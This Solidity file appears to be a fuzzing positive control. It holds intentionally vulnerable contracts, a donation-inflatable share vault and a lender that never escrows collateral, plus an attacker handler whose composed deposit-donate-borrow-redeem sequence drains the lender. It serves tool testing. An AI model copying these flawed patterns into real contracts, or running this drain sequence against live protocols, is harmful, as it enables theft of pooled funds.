// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// TASK-2 positive control: a GENUINE 2-contract, multi-step, ATTACKER-REACHABLE
// stateful bug — donation-then-borrow with unescrowed collateral. No oracle, no
// admin, no external-condition: everything the exploit needs is attacker-controlled
// (own capital + permissionless entrypoints), so a winning fuzz sequence is directly
// `attacker_reachable`. The composed attacker primitives (donate + a cross-contract
// deposit→borrow→redeem chain) are exactly what the campaign engine now ships.
//
// The exploit (found by composing handle_* in sequence):
//   1. deposit 1 wei into SharePool  -> attacker is the SOLE shareholder (1 share)
//   2. donate D tokens straight into SharePool (no mint) -> share price inflates
//   3. borrow ~D from Lender against the 1 inflated share (Lender never ESCROWS it)
//   4. redeem the share from SharePool -> get the donated D back (sole owner)
//   net: +D drained from the Lender's liquidity. Profit = the borrowed amount.

contract MockToken {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt; balanceOf[to] += amt; return true;
    }
    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt; balanceOf[to] += amt; return true;
    }
}

// A share vault whose price-per-share reads its RAW token balance, so a direct
// donation (transfer in without minting) inflates it — the first-depositor class.
contract SharePool {
    MockToken public token;
    uint256 public totalShares;
    mapping(address => uint256) public shares;
    constructor(MockToken t) { token = t; }

    function pricePerShare() public view returns (uint256) {
        if (totalShares == 0) return 1e18;
        return token.balanceOf(address(this)) * 1e18 / totalShares;   // donation-inflatable
    }
    function deposit(uint256 amt) external returns (uint256 s) {
        s = amt * 1e18 / pricePerShare();
        token.transferFrom(msg.sender, address(this), amt);
        totalShares += s; shares[msg.sender] += s;
    }
    function redeem(uint256 s) external returns (uint256 amt) {
        amt = s * pricePerShare() / 1e18;
        shares[msg.sender] -= s; totalShares -= s;
        token.transfer(msg.sender, amt);
    }
}

// Lends token against SharePool shares valued at the (manipulable) price-per-share.
// THE BUG: it checks collateral value but never takes CUSTODY of the shares, so the
// borrower can redeem them from the pool right after borrowing.
contract Lender {
    MockToken public token;
    SharePool public pool;
    mapping(address => uint256) public debt;
    constructor(MockToken t, SharePool p) { token = t; pool = p; }

    function borrow(uint256 amt) external {
        uint256 collateral = pool.shares(msg.sender) * pool.pricePerShare() / 1e18;
        require(debt[msg.sender] + amt <= collateral, "undercollateralized");
        debt[msg.sender] += amt;
        token.transfer(msg.sender, amt);   // Lender's liquidity
    }
}

// Chimera-style handler = the ATTACKER (models the campaign's attacker primitives:
// handle_donate + handle_composeAB across SharePool and Lender). Echidna/medusa call
// the public handle_* in random sequences; the property fails when the attacker ends
// richer than it started — i.e. the composed sequence drained the Lender.
contract StatefulAttackHandler {
    MockToken public token;
    SharePool public pool;
    Lender public lender;
    uint256 public startBalance;

    constructor() {
        token = new MockToken();
        pool = new SharePool(token);
        lender = new Lender(token, pool);
        token.mint(address(lender), 1_000_000e18);      // Lender liquidity (the loot)
        token.mint(address(this), 100e18);              // attacker's own working capital
        startBalance = token.balanceOf(address(this));
    }

    function attackerBalance() public view returns (uint256) {
        return token.balanceOf(address(this));
    }

    // --- attacker primitives (attacker-controlled inputs ONLY) --------------- //
    function handle_deposit(uint256 amt) public {
        amt = 1 + (amt % 2e18);
        if (token.balanceOf(address(this)) < amt) return;
        pool.deposit(amt);
    }
    // DONATION: transfer straight into the pool, inflating price per share.
    function handle_donate(uint256 amt) public {
        amt = amt % (token.balanceOf(address(this)) + 1);
        token.transfer(address(pool), amt);
    }
    function handle_borrow(uint256 amt) public {
        amt = amt % (token.balanceOf(address(lender)) + 1);
        lender.borrow(amt);
    }
    function handle_redeem(uint256 s) public {
        uint256 have = pool.shares(address(this));
        if (have == 0) return;
        pool.redeem(1 + (s % have));
    }
    // COMPOSED cross-contract sequence: deposit tiny -> donate -> borrow -> redeem,
    // the whole donation-then-borrow exploit in one atomic call.
    function handle_composeAB(uint256 donation, uint256 borrowAmt) public {
        donation = donation % (token.balanceOf(address(this)) + 1);
        if (token.balanceOf(address(this)) < 1) return;
        pool.deposit(1);                                  // 1 share, sole owner
        token.transfer(address(pool), donation);          // inflate price
        uint256 collateral = pool.shares(address(this)) * pool.pricePerShare() / 1e18;
        uint256 want = borrowAmt % (collateral + 1);
        if (want > 0 && want <= token.balanceOf(address(lender))) lender.borrow(want);
        uint256 have = pool.shares(address(this));
        if (have > 0) pool.redeem(have);                  // reclaim the donation
    }

    // The invariant the exploit falsifies: the attacker cannot end richer than it
    // began using only its own capital + permissionless calls.
    function echidna_attacker_no_profit() public view returns (bool) {
        return token.balanceOf(address(this)) <= startBalance;
    }
    function property_attacker_no_profit() public view returns (bool) {
        return token.balanceOf(address(this)) <= startBalance;
    }
}
